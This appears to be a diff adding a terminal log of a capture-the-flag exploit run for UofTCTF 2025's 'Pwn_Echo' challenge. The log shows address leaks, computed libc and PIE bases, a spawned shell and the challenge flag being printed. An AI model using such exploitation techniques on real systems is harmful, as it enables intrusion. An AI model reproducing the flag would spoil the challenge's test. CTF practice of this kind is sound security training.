@@ -1,0 +1,19 @@
+mito@mito-virtual-machine:~/CTF/UofTCTF_2025/Pwn_Echo$ python3 solve.py r
+[+] Opening connection to 34.29.214.123 on port 5000: Done
+/home/mito/CTF/UofTCTF_2025/Pwn_Echo/solve.py:32: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  pie_leak = int(s.recvuntil("\n"), 16)
+pie_leak = 0x5822de285275
+pie_base = 0x5822de284000
+read_addr = 0x7e3504e6ca50
+libc_base = 0x7e3504d51000
+/home/mito/CTF/UofTCTF_2025/Pwn_Echo/solve.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline("/bin/sh\x00")
+[*] Switching to interactive mode
+AAAAA(\x80(\xA                                                              \xd7                                                             \x00                        a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \x11                                                                                          s \x80(id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+$ ls -l
+total 20
+-rwxr-xr-x 1 nobody nogroup 16368 Jan  7 03:30 chall
+-rw-r--r-- 1 nobody nogroup    45 Jan  7 03:31 flag.txt
+$ cat flag.txt
+uoftctf{c4n4ry_15_u53l355_1f_607_15_wr174bl3}$
